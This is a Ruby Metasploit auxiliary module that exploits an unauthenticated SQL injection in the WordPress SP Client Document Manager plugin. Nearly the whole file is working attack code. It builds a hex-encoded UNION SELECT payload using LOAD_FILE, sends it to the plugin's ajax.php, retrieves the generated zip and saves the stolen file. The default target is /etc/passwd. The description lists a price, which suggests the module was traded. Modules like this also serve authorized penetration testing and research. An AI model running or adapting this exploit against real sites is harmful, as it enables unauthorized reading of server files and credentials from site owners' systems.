##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress SP Client Document Manager Arbitrary File Read via SQLi',
      'Description'    => %q{This module reads file from the file system of the vulnerable instance.

      This module exploits an unauthenticated SQL injection in order to read a file from the file
      system with permissions of the web server user. Likely requires a slightly misconfigured
      database in the that the DB user used by the Wordpress installation must have FILE permissions.
      This is a common misconfiguration.

      Categories: Wordpress, SQL Injection

      Price: 2

      Video: none

      OS: Multi

      Arch: Multi

      Requirements: Metasploit Framework
      },
      'References'     =>
        [
          ['URL', 'http://1337day.com/exploit/22911']
        ],
      'Author'         =>
        [
          'bperry',
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => "Nov 22 2014"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to Wordpress', '/']),
        OptString.new('FILEPATH', [true, 'The filepath to read on the server', '/etc/passwd'])
      ], self.class)
  end

  def run

    left_marker = Rex::Text.rand_text_alpha(8)
    right_marker = Rex::Text.rand_text_alpha(8)

    get_file = " UNION ALL SELECT NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(HEX(LOAD_FILE(0x#{datastore['FILEPATH'].unpack("H*")[0]})) AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL#"

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'sp-client-document-manager', 'ajax.php'),
      'vars_get' => {
        'function' => 'download-project',
        'id' => '1' + get_file
      }
    })

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-content', 'uploads', 'sp-client-document-manager', '.zip')
    })

    data = ''
    res.body.scan(/#{left_marker}(.*)#{right_marker}/).each do |file|
      data = file
    end

    data = data.pack('H*')

    path = store_loot('wordpress.file', 'binary/octet-stream', datastore['RHOST'], data, datastore['FILEPATH'])
    print_status ("File saved to #{path}.")
    print_status ("If the file is empty, the file may not exist on the server or the user does not have FILE permissions.")

  end
end

